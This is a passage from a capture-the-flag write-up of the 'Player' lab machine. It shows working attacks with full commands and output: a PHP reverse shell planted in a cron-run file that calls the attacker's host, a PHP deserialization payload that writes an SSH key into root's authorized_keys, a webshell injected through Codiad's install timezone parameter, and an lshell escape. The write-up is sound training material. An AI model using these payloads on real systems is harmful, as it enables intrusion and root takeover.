```

www-data@player:/$ ls -l /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
-rw-r--r-- 1 www-data www-data 286 Mar 25 01:12 /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php

```

The file itself handles the database connection:

```

<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "integrity";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
?>

```

That said, I don’t really care what it does. I’ll add a reverse shell into the file:

```

<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "integrity";

$sock=fsockopen("10.10.14.8",443);
exec("/bin/sh -i <&3 >&3 2>&3");

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
?>

```

I start a listener, and on the next minute, I have a root shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.145.
Ncat: Connection from 10.10.10.145:42576.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```

And the flag:

```

root@player:~# cat root.txt
7dfc49f8************************

```

#### Harder Path - PHP Deserialization

I didn’t originally solve this way, but IppSec did a [great video on PHP deserialization](https://youtu.be/HaW15aMzBUM) about a month ago that comes in handy here, and this is a perfect place to play with it.

There three important bits here for the attack. First, the `playBuff` class, which has a `__wakeup()` function. This function is a [magic method](https://www.php.net/manual/en/language.oop5.magic.php) that will run on an deserialization calls. The idea is to reestablish any database connections or things like that.

In this case, it will write `$this->logData` to `$this->logFile`.

```

class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __wakeup()
        {
                file_put_contents(__DIR__."/".$this->logFile,$this->logData);
        }
}

```

The other two important lines are:

```

$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data))

```

The contents of file are read, and then passed to `unserialize`.

The file is owned by and writeable by telegen, who I have a shell as:

```

www-data@player:/$ ls -l /var/lib/playbuff/merge.log 
-rw------- 1 telegen telegen 13 Jan 17 09:16 /var/lib/playbuff/merge.log

```

I’ll write a local PHP script that will create a `playBuff` object with the values I want it to have in order to write to `/root/.ssh/authorized_keys`:

```

<?php

class playBuff
{
        public function __construct()
        {
            $this->logFile="/../../../../../../../../root/.ssh/authorized_keys";
            $this->logData="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0mJaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali";
        }
}

echo serialize(new playBuff());
?>

```

Since the `__wakeup` call adds `__DIR__` + ‘/’ to the front of the path, I’ll make sure to include `../` to get up to the file system root.

I’ll run the script to get the serialized object:

```

root@kali# php deserialize.php 
O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH
3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0m
JaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali";}

```

Now I’ll echo that into the target file:

```

telegen@player:/$ echo 'O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH
3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0m
JaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali";}' > /var/lib/playbuff/merge.log

telegen@player:/$ cat /var/lib/playbuff/merge.log
O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH
3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0m
JaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREE
o1FCc= root@kali";}

```

After a minute runs, I can SSH as root:

```

root@kali# ssh -i ~/id_rsa_generated root@10.10.10.145
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-148-generic x86_64)
 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Jan 17 07:20:25 IST 2020

  System load:  0.08               Processes:           174
  Usage of /:   14.5% of 17.59GB   Users logged in:     0
  Memory usage: 7%                 IP address for eth0: 10.10.10.145
  Swap usage:   0%

  => There is 1 zombie process.

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Fri Aug 23 22:21:38 2019
root@player:~#

```

## Beyond Root

### Alternative Shell as www-data

#### Codiad GitHub

The software running on dev, Codiad, is open source with the code on [GitHub](https://github.com/Codiad/Codiad). On the front readme, 9 months ago it was posted that this code is no longer maintained:

![1562996553671](https://0xdfimages.gitlab.io/img/1562996553671.png)

The code is kind of a mess. There’s probably multiple vulnerabilities in it.

#### process.php

There’s a bug in [components/install/process.php](https://github.com/Codiad/Codiad/blob/master/components/install/process.php). It will write `config.php` to disk, and there is a parameter, the timezone, that is a POST parameter.

```

    $config_data = '<?php
/*
*  Copyright (c) Codiad & Kent Safranski (codiad.com), distributed
*  as-is and without warranty under the MIT License. See
*  [root]/license.txt for more. This information must remain intact.
*/
//////////////////////////////////////////////////////////////////
// CONFIG
//////////////////////////////////////////////////////////////////
// PATH TO CODIAD
define("BASE_PATH", "' . $path . '");
// BASE URL TO CODIAD (without trailing slash)
define("BASE_URL", "' . $_SERVER["HTTP_HOST"] . $rel . '");
// THEME : default, modern or clear (look at /themes)
define("THEME", "default");
// ABSOLUTE PATH
define("WHITEPATHS", BASE_PATH . ",/home");
// SESSIONS (e.g. 7200)
$cookie_lifetime = "0";
// TIMEZONE
date_default_timezone_set("' . $_POST['timezone'] . '");
// External Authentification
//define("AUTH_PATH", "/path/to/customauth.php");
//////////////////////////////////////////////////////////////////
// ** DO NOT EDIT CONFIG BELOW **
//////////////////////////////////////////////////////////////////
// PATHS
define("COMPONENTS", BASE_PATH . "/components");
define("PLUGINS", BASE_PATH . "/plugins");
define("THEMES", BASE_PATH . "/themes");
define("DATA", BASE_PATH . "/data");
define("WORKSPACE", BASE_PATH . "/workspace");
// URLS
define("WSURL", BASE_URL . "/workspace");
// Marketplace
//define("MARKETURL", "http://market.codiad.com/json");
// Update Check
//define("UPDATEURL", "http://update.codiad.com/?v={VER}&o={OS}&p={PHP}&w={WEB}&a={ACT}");
//define("ARCHIVEURL", "https://github.com/Codiad/Codiad/archive/master.zip");
//define("COMMITURL", "https://api.github.com/repos/Codiad/Codiad/commits");
';
    saveFile($config, $config_data);

```

I’ll look at the code to see what I need to write it. I need to get into this block:

```

if (!file_exists($users) && !file_exists($projects) && !file_exists($active)) {

```

At the very top of the file, I see where these variables are set:

```

    $path = $_POST['path'];

    $rel = str_replace('/components/install/process.php', '', $_SERVER['REQUEST_URI']);

    $workspace = $path . "/workspace";
    $users = $path . "/data/users.php";
    $projects = $path . "/data/projects.php";
    $active = $path . "/data/active.php";
    $config = $path . "/config.php";

```

The good news is that I can control that path. I can give it a path on one of the other virtual hosts, or in a folder in demo, and it will successfully not find those files. I’ll start with `path=/var/www/chat/0xdf`. I also need to give it a project name variable, which I can give the same path.

#### Write Webshell

The `timezone` input it taken and written directly into a php file. So I’ll include an extra bit. Since I’m injecting into the middle of a string, I’ll include a `die()` so that I don’t try to run anything that follows and throw an error.

This command will write webshell:

```

root@kali# curl --data 'path=/var/www/chat/0xdf&project_path=/var/www/chat/0xdf/data&timezone=UTC");system($_GET["cmd"]); die(); ?>' http://dev.player.htb/components/install/process.php
success

```

Now I can get execution:

```

root@kali# curl http://chat.player.htb/0xdf/config.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

The same thing would have worked using a known directory on the same virtual host, like `data` (which I can see in the [Github](https://github.com/Codiad/Codiad)):

```

root@kali# curl --data 'path=/var/www/demo/data/0xdf&project_path=/var/www/demo/data/0xdf/data&timezone=UTC");system($_GET["cmd"]); die(); ?>' http://dev.player.htb/components/install/process.php
success
root@kali# curl http://dev.player.htb/data/0xdf/config.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### lshell Escape

jkr pointed out to me [this issue](https://github.com/ghantoos/lshell/issues/147) with lshell. By running SSH with the command “‘echo’&&’bash’”, I can get a full shell:

```

root@kali# ssh telegen@10.10.10.145 -p 6686 "'echo'&&'bash'"
telegen@10.10.10.145's password: 
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.14.8 50890 6686
  SSH_CONNECTION=10.10.14.8 50890 10.10.10.145 6686

id
uid=1000(telegen) gid=1000(telegen) groups=1000(telegen),46(plugdev)
cat user.txt
30e47abe************************

```

This allows me to skip over a couple steps in this box.